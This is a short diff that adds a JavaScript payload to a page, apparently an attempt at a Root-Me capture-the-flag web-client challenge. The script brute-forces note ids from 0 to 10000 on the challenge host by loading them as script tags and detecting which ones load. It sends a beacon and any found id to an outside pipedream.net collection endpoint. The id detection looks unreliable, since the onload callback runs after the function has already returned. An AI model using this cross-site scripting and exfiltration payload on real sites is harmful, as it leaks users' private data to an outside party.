@@ -1,1 +1,26 @@
 Miaou World !
+<script>
+function checkId(id) {
+    const script = document.createElement('script');
+    script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${id}`;
+    let response = "";
+    script.onload = () => response = id;
+    document.body.appendChild(script);
+    return response;
+} 
+
+let firstRequest = new XMLHttpRequest();
+firstRequest.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
+firstRequest.send("test=true");
+
+for (let i = 0; i < 10001; i++) {
+
+    let resp = checkId(i);
+    if (resp != "") {
+        let xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
+        xhr.send("id="+i);
+        break;
+    }
+}
+</script>
